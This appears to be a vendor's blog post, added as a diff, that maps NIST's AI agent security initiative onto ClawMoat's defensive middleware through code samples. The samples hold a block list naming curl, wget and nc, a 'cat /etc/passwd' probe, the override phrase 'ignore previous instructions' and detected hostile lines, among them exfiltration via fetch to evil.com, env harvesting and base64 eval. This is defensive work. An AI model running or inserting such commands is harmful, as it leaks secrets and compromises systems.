@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NIST Is Standardizing AI Agent Security — ClawMoat Already Ships It</title>
+<meta name="description" content="NIST launched the AI Agent Standards Initiative on Feb 20, 2026. Every security concern they raised — least privilege, tool validation, prompt injection, supply chain — ClawMoat already ships as open-source middleware.">
+<meta property="og:title" content="NIST Is Standardizing AI Agent Security — ClawMoat Already Ships It">
+<meta property="og:description" content="Every NIST recommendation maps to a ClawMoat module you can npm install today.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://clawmoat.com/blog/nist-ai-agent-standards-clawmoat.html">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏰</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--navy:#0F172A;--navy-light:#1E293B;--navy-mid:#334155;--blue:#3B82F6;--emerald:#10B981;--white:#F8FAFC;--gray:#94A3B8;--red:#EF4444;--amber:#F59E0B}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--navy);color:var(--white);line-height:1.7}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline}
+.container{max-width:760px;margin:0 auto;padding:0 24px}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(15,23,42,.95);backdrop-filter:blur(12px);border-bottom:1px solid rgba(59,130,246,.15);padding:16px 0}
+nav .inner{max-width:760px;margin:0 auto;padding:0 24px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:1.25rem;font-weight:700;color:var(--white)}
+.logo span{color:var(--emerald)}
+.nav-links{display:flex;gap:24px}
+.nav-links a{color:var(--gray);font-size:.9rem}
+.nav-links a:hover{color:var(--white);text-decoration:none}
+
+article{padding:120px 0 80px}
+.meta{color:var(--gray);font-size:.9rem;margin-bottom:32px}
+article h1{font-size:clamp(1.8rem,4vw,2.4rem);font-weight:800;line-height:1.2;margin-bottom:12px;letter-spacing:-.02em}
+article h2{font-size:1.4rem;font-weight:700;margin:48px 0 16px;color:var(--white)}
+article h3{font-size:1.15rem;font-weight:700;margin:32px 0 12px;color:var(--white)}
+article p{color:var(--gray);font-size:1rem;margin-bottom:16px}
+article strong{color:var(--white)}
+article em{color:var(--gray)}
+article ul,article ol{color:var(--gray);margin:0 0 16px 24px}
+article li{margin-bottom:8px}
+article hr{border:none;border-top:1px solid var(--navy-mid);margin:48px 0}
+
+pre{background:#0a0e17;border:1px solid var(--navy-mid);border-radius:10px;padding:20px;overflow-x:auto;margin:16px 0 24px;font-size:.85rem;line-height:1.7}
+code{font-family:'SF Mono',Consolas,monospace;font-size:.9em}
+pre code{color:var(--gray)}
+p code{background:var(--navy-light);padding:2px 6px;border-radius:4px;font-size:.85em;color:var(--emerald)}
+
+.nist-box{background:var(--navy-light);border-left:3px solid var(--amber);border-radius:0 10px 10px 0;padding:16px 20px;margin:16px 0}
+.nist-box .label{color:var(--amber);font-weight:700;font-size:.85rem;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px}
+.nist-box p{margin-bottom:0;font-size:.95rem}
+
+.ships-box{background:rgba(16,185,129,.06);border-left:3px solid var(--emerald);border-radius:0 10px 10px 0;padding:16px 20px;margin:16px 0}
+.ships-box .label{color:var(--emerald);font-weight:700;font-size:.85rem;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px}
+.ships-box p{margin-bottom:0;font-size:.95rem}
+
+table{width:100%;border-collapse:collapse;margin:16px 0 24px;font-size:.9rem}
+th{text-align:left;padding:10px 12px;border-bottom:2px solid var(--navy-mid);color:var(--white);font-weight:600}
+td{padding:8px 12px;border-bottom:1px solid var(--navy-mid);color:var(--gray)}
+tr:hover td{background:rgba(59,130,246,.04)}
+
+.tags{display:flex;gap:8px;margin-top:32px;flex-wrap:wrap}
+.tag{background:rgba(59,130,246,.12);color:var(--blue);padding:4px 12px;border-radius:20px;font-size:.8rem}
+
+.back{display:inline-flex;align-items:center;gap:6px;color:var(--gray);font-size:.9rem;margin-bottom:24px}
+.back:hover{color:var(--white);text-decoration:none}
+
+.cta{background:linear-gradient(135deg,rgba(59,130,246,.15),rgba(16,185,129,.15));border:1px solid rgba(59,130,246,.3);border-radius:12px;padding:32px;margin:32px 0;text-align:center}
+.cta h3{margin-top:0;font-size:1.3rem}
+.cta p{font-size:.95rem}
+.cta code{font-size:1rem}
+
+.timeline{position:relative;padding-left:24px;margin:16px 0 24px}
+.timeline::before{content:'';position:absolute;left:6px;top:4px;bottom:4px;width:2px;background:var(--navy-mid)}
+.timeline .event{position:relative;margin-bottom:16px}
+.timeline .event::before{content:'';position:absolute;left:-22px;top:6px;width:10px;height:10px;border-radius:50%;background:var(--amber)}
+.timeline .event strong{color:var(--white)}
+
+footer{border-top:1px solid rgba(255,255,255,.06);padding:32px 0;color:var(--gray);font-size:.85rem;text-align:center}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="inner">
+    <a href="/" class="logo">🏰 Claw<span>Moat</span></a>
+    <div class="nav-links">
+      <a href="/">Home</a>
+      <a href="/blog/">Blog</a>
+      <a href="https://github.com/darfaz/clawmoat">GitHub</a>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+<article>
+<a href="/blog/" class="back">← Back to Blog</a>
+<h1>NIST Is Standardizing AI Agent Security — ClawMoat Already Ships It</h1>
+<div class="meta">February 28, 2026 · 10 min read</div>
+
+<p>On February 20, 2026, NIST's Center for AI Standards and Innovation (CAISI) <a href="https://www.nist.gov/news-events/news/2026/02/announcing-ai-agent-standards-initiative-interoperable-and-secure">launched the AI Agent Standards Initiative</a> — the U.S. government's first formal effort to standardize security for autonomous AI agents. The initiative includes an <a href="https://www.nist.gov/news-events/news/2026/01/caisi-issues-request-information-about-securing-ai-agent-systems">RFI on AI Agent Security</a> (docket NIST-2025-0035, comments due March 9), a <a href="https://www.nccoe.nist.gov/projects/software-and-ai-agent-identity-and-authorization">draft concept paper on Agent Identity and Authorization</a> from NCCoE (due April 2), and upcoming listening sessions for healthcare, finance, and education.</p>
+
+<p>This is a big deal. The federal government is saying: <strong>AI agents that take autonomous actions present unique security challenges</strong>, and we need standards for them.</p>
+
+<p>We agree. That's why we've been shipping those standards as open-source code since January 2026.</p>
+
+<p>Here's every security concern NIST raised — and the ClawMoat module that already addresses it.</p>
+
+<hr>
+
+<h2>1. Constraining Agent Access in Deployment Environments</h2>
+
+<div class="nist-box">
+<div class="label">📋 What NIST Says</div>
+<p>The RFI asks about <em>"interventions in deployment environments to address security risks affecting AI agent systems, including methods to <strong>constrain and monitor the extent of agent access</strong> in the deployment environment."</em><br>— <a href="https://www.nist.gov/news-events/news/2026/01/caisi-issues-request-information-about-securing-ai-agent-systems">NIST CAISI RFI, January 2026</a></p>
+</div>
+
+<div class="ships-box">
+<div class="label">🏰 What ClawMoat Ships</div>
+<p><strong>Host Guardian</strong> — four permission tiers that constrain what an AI agent can do on the host system, from full lockdown to controlled access.</p>
+</div>
+
+<pre><code>import { createHostGuardian } from 'clawmoat';
+
+const guardian = createHostGuardian({
+  tier: 'restricted',  // lockdown | restricted | standard | trusted
+  rules: {
+    filesystem: { writable: ['/tmp', './workspace'], blocked: ['~/.ssh', '~/.aws'] },
+    network:    { allowedHosts: ['api.openai.com', 'github.com'] },
+    processes:  { blocked: ['curl', 'wget', 'nc'] },
+    env:        { redact: ['AWS_SECRET_ACCESS_KEY', 'DATABASE_URL'] }
+  }
+});
+
+// Every agent action passes through the guardian
+const result = await guardian.evaluate({
+  action: 'exec',
+  command: 'cat /etc/passwd'
+});
+// → { allowed: false, reason: 'Path /etc/passwd outside permitted directories' }</code></pre>
+
+<p>Four tiers from <code>lockdown</code> (zero external access) to <code>trusted</code> (full access with audit logging). Most deployments run <code>restricted</code> — the agent can read docs and call APIs, but can't touch SSH keys, spawn reverse shells, or exfiltrate environment variables.</p>
+
+<h2>2. Tool Validation and Authorization</h2>
+
+<div class="nist-box">
+<div class="label">📋 What NIST Says</div>
+<p>The NCCoE concept paper focuses on how to <em>"identify, manage, and authorize access and actions taken by software agents, including AI agents"</em> — specifically, controlling what tools agents can invoke and what those tools can do.<br>— <a href="https://www.nccoe.nist.gov/projects/software-and-ai-agent-identity-and-authorization">NCCoE Draft Concept Paper, February 2026</a></p>
+</div>
+
+<div class="ships-box">
+<div class="label">🏰 What ClawMoat Ships</div>
+<p><strong>McpFirewall</strong> — intercepts every MCP tool call with allowlisting, read-only enforcement, argument validation, and rate limiting.</p>
+</div>
+
+<pre><code>import { McpFirewall } from 'clawmoat';
+
+const firewall = new McpFirewall({
+  tools: {
+    'database_query':  { mode: 'read-only', blocked: ['DROP', 'DELETE', 'TRUNCATE'] },
+    'file_write':      { allowed: false },
+    'web_search':      { rateLimit: { max: 10, windowMs: 60000 } },
+    'send_email':      { requireApproval: true }
+  },
+  defaultPolicy: 'deny'  // Unknown tools are blocked by default
+});
+
+// Wraps any MCP server
+const safeMcp = firewall.wrap(mcpServer);
+
+// Agent tries: DELETE FROM users WHERE 1=1
+// → Blocked: write operation matches pattern "DELETE" on read-only tool</code></pre>
+
+<p>McpFirewall recognizes <strong>29 write-operation patterns</strong> across SQL, filesystem, and API calls. It can enforce read-only mode on database tools while allowing search tools — with per-tool rate limits to prevent data exfiltration through volume.</p>
+
+<h2>3. Adversarial Data and Prompt Injection</h2>
+
+<div class="nist-box">
+<div class="label">📋 What NIST Says</div>
+<p><em>"This includes risks from models interacting with adversarial data (such as in <strong>indirect prompt injection</strong>), risks from the use of insecure models (such as models that have been subject to data poisoning)."</em><br>— <a href="https://www.nist.gov/news-events/news/2026/01/caisi-issues-request-information-about-securing-ai-agent-systems">NIST CAISI RFI, January 2026</a></p>
+</div>
+
+<div class="ships-box">
+<div class="label">🏰 What ClawMoat Ships</div>
+<p><strong>Prompt Injection Scanner</strong> — pattern-based detection of injection attempts in tool outputs, user inputs, and retrieved documents before they reach the model.</p>
+</div>
+
+<pre><code>import { PromptInjectionScanner } from 'clawmoat';
+
+const scanner = new PromptInjectionScanner();
+
+// Scan tool output before feeding it back to the agent
+const toolOutput = await mcpTool.call('web_scrape', { url: untrustedUrl });
+const scan = scanner.scan(toolOutput);
+
+if (scan.injectionDetected) {
+  console.log(scan.threats);
+  // → [{ type: 'instruction_override', pattern: 'ignore previous instructions',
+  //       severity: 'critical', location: 'line 47' }]
+  // Quarantine or sanitize before passing to model
+}</code></pre>
+
+<p>The scanner detects role hijacking, instruction overrides, data exfiltration attempts, and encoding-based evasion. It runs in &lt;2ms per scan — fast enough to sit in the hot path of every tool call without latency impact.</p>
+
+<h2>4. Data Protection and Sensitive Information</h2>
+
+<div class="nist-box">
+<div class="label">📋 What NIST Says</div>
+<p>The Initiative highlights sector-specific concerns in <strong>healthcare, finance, and education</strong>, with listening sessions planned to identify barriers to secure AI adoption in these regulated industries.<br>— <a href="https://www.nist.gov/caisi/ai-agent-standards-initiative">NIST AI Agent Standards Initiative, February 2026</a></p>
+</div>
+
+<div class="ships-box">
+<div class="label">🏰 What ClawMoat Ships</div>
+<p><strong>Secret Scanner</strong> and <strong>FinanceGuard</strong> — field-level redaction of credentials, PII, and financial data before it leaves the agent's context.</p>
+</div>
+
+<pre><code>import { SecretScanner, FinanceGuard } from 'clawmoat';
+
+// Secret Scanner: catches API keys, tokens, passwords in any text
+const secrets = new SecretScanner();
+const result = secrets.scan(agentOutput);
+// → Detects: AWS keys, GitHub tokens, JWTs, database URLs, SSNs, credit cards
+
+// FinanceGuard: specialized for financial data in agent workflows
+const finance = new FinanceGuard({
+  redact: ['account_number', 'routing_number', 'ssn', 'credit_card'],
+  audit: true,  // Log every redaction for SOX/PCI compliance
+  allowFields: ['transaction_date', 'amount', 'category']
+});
+
+const safeOutput = finance.process(agentResponse);
+// "Transfer $5,000 from account 7834-2291-0054 routing 021000021"
+// → "Transfer $5,000 from account [REDACTED] routing [REDACTED]"</code></pre>
+
+<p>FinanceGuard generates <strong>SOX and PCI-DSS compliance reports</strong> automatically — every redaction is logged with timestamp, field type, and context. When NIST's listening sessions identify requirements for finance-sector AI agents, this is the kind of infrastructure they'll recommend.</p>
+
+<h2>5. Supply Chain Security</h2>
+
+<div class="nist-box">
+<div class="label">📋 What NIST Says</div>
+<p><em>"Risks from the use of insecure models (such as models that have been subject to <strong>data poisoning</strong>)"</em> — and more broadly, the NIST AI RMF (AI 600-1) GenAI Profile identifies supply chain integrity as a core risk management action area, with <strong>200+ suggested actions</strong>.<br>— <a href="https://airc.nist.gov/technical-reports/">NIST AI 600-1 GenAI Profile</a></p>
+</div>
+
+<div class="ships-box">
+<div class="label">🏰 What ClawMoat Ships</div>
+<p><strong>Skill Integrity Checker</strong> — hash verification and behavioral analysis of AI agent skills/plugins before installation.</p>
+</div>
+
+<pre><code>import { SkillIntegrityChecker } from 'clawmoat';
+
+const checker = new SkillIntegrityChecker();
+
+const audit = await checker.scan('./skills/untrusted-plugin/');
+// Checks for 14 suspicious patterns:
+//   - Obfuscated code (base64 decode, eval, Function constructor)
+//   - Network exfiltration (fetch to unknown hosts, DNS tunneling)
+//   - File system access outside workspace
+//   - Environment variable harvesting
+//   - Cryptocurrency mining signatures
+//   - Hidden process spawning
+//   - Permission escalation attempts
+
+console.log(audit);
+// → { safe: false, threats: 3, details: [
+//      { pattern: 'env_harvesting', file: 'index.js', line: 42,
+//        code: 'Object.entries(process.env).forEach(...)' },
+//      { pattern: 'network_exfil', file: 'utils.js', line: 17,
+//        code: 'fetch("https://evil.com/collect", { body: data })' },
+//      { pattern: 'obfuscated_code', file: 'helper.js', line: 3,
+//        code: 'eval(Buffer.from("...", "base64").toString())' }
+//    ]}</code></pre>
+
+<p>We've already used this to audit the OpenClaw skill ecosystem and found <a href="/blog/386-malicious-skills.html">386 malicious skills</a> with patterns ranging from credential theft to cryptocurrency mining. The scanner catches what <code>npm audit</code> misses because it analyzes <em>behavior</em>, not just known CVEs.</p>
+
+<h2>6. Monitoring and Audit Trails</h2>
+
+<div class="nist-box">
+<div class="label">📋 What NIST Says</div>
+<p>The Initiative's three strategic pillars include <em>"advancing research in areas of AI agent <strong>security and identity</strong> to enable new use cases and to promote <strong>trusted adoption</strong> across sectors."</em> The RFI specifically asks about <em>"methods for <strong>measuring the security</strong> of AI agent systems."</em><br>— <a href="https://www.nist.gov/caisi/ai-agent-standards-initiative">NIST AI Agent Standards Initiative, February 2026</a></p>
+</div>
+
+<div class="ships-box">
+<div class="label">🏰 What ClawMoat Ships</div>
+<p><strong>Network Egress Logger</strong> and full audit trail with compliance report generation.</p>
+</div>
+
+<pre><code>import { NetworkEgressLogger, ComplianceReporter } from 'clawmoat';
+
+// Log every outbound connection the agent makes
+const egress = new NetworkEgressLogger({
+  logFile: './audit/network-egress.jsonl',
+  alertOn: { unknownHosts: true, highVolume: true, unusualPorts: true }
+});
+
+// Generate compliance reports
+const reporter = new ComplianceReporter({
+  framework: 'SOX',  // or 'PCI-DSS', 'HIPAA'
+  period: 'monthly',
+  include: ['tool_calls', 'data_access', 'redactions', 'blocked_actions']
+});
+
+const report = await reporter.generate();
+// → Structured report: 4,291 tool calls, 847 redactions,
+//    23 blocked actions, 0 data exfiltration attempts
+//    Exportable as PDF, JSON, or CSV</code></pre>
+
+<p>Every ClawMoat module writes to a unified audit log. When a regulator asks "what did your AI agent do with customer data last Tuesday?" — you have the answer in milliseconds, not weeks.</p>
+
+<hr>
+
+<h2>The Full Mapping</h2>
+
+<table>
+<thead>
+<tr><th>NIST Concern</th><th>Document</th><th>ClawMoat Module</th><th>Status</th></tr>
+</thead>
+<tbody>
+<tr><td>Constrain agent access</td><td>CAISI RFI</td><td>Host Guardian (4 tiers)</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+<tr><td>Tool authorization</td><td>NCCoE Concept Paper</td><td>McpFirewall</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+<tr><td>Prompt injection</td><td>CAISI RFI</td><td>Prompt Injection Scanner</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+<tr><td>Data protection (PII/financial)</td><td>Listening Sessions</td><td>Secret Scanner + FinanceGuard</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+<tr><td>Supply chain integrity</td><td>AI 600-1 / RFI</td><td>Skill Integrity Checker</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+<tr><td>Security measurement</td><td>CAISI RFI</td><td>Network Egress Logger + Audit</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+<tr><td>Agent identity</td><td>NCCoE Concept Paper</td><td>Audit trail per-agent</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+<tr><td>Sector-specific (finance)</td><td>Listening Sessions</td><td>FinanceGuard + SOX/PCI reports</td><td style="color:var(--emerald)">✅ Shipping</td></tr>
+</tbody>
+</table>
+
+<h2>What This Means</h2>
+
+<p>NIST is doing the right thing. AI agents that can <em>"work autonomously for hours, write and debug code, manage emails and calendars, and shop for goods"</em> (their words) need security standards. The RFI, the NCCoE concept paper, the listening sessions — this is how good policy gets made.</p>
+
+<p>But standards take time. The RFI closes March 9. The concept paper comments close April 2. Guidelines will follow months or years later. Meanwhile, agents are running in production <em>right now</em>, handling real data, making real API calls, accessing real systems.</p>
+
+<p><strong>We're not waiting for the standards. We're shipping them.</strong></p>
+
+<p>ClawMoat is open-source, MIT-licensed, and works with any AI agent framework. Every module described above is in npm today. If NIST's final guidelines recommend something we haven't built yet, we'll build it. If they recommend something better than what we have, we'll adopt it.</p>
+
+<p>But we're not going to leave agents unprotected while the comment period runs.</p>
+
+<div class="cta">
+<h3>Start Securing Your Agents Today</h3>
+<p>Every NIST recommendation above is available as a single npm install.</p>
+<pre><code>npm install clawmoat</code></pre>
+<p style="margin-top:16px">
+<a href="https://github.com/darfaz/clawmoat" style="color:var(--white);background:var(--blue);padding:10px 24px;border-radius:8px;font-weight:600;display:inline-block;margin:4px">⭐ Star on GitHub</a>
+<a href="/scan/" style="color:var(--white);background:var(--emerald);padding:10px 24px;border-radius:8px;font-weight:600;display:inline-block;margin:4px">🔍 Free Security Scan</a>
+</p>
+</div>
+
+<div class="tags">
+<span class="tag">NIST</span>
+<span class="tag">CAISI</span>
+<span class="tag">AI-agent-security</span>
+<span class="tag">standards</span>
+<span class="tag">compliance</span>
+<span class="tag">least-privilege</span>
+</div>
+
+</article>
+</div>
+
+<footer>
+<div class="container">
+  © 2026 ClawMoat · <a href="https://github.com/darfaz/clawmoat">GitHub</a> · <a href="/privacy-policy/">Privacy</a> · <a href="/terms-of-service/">Terms</a>
+</div>
+</footer>
+
+</body>
+</html>
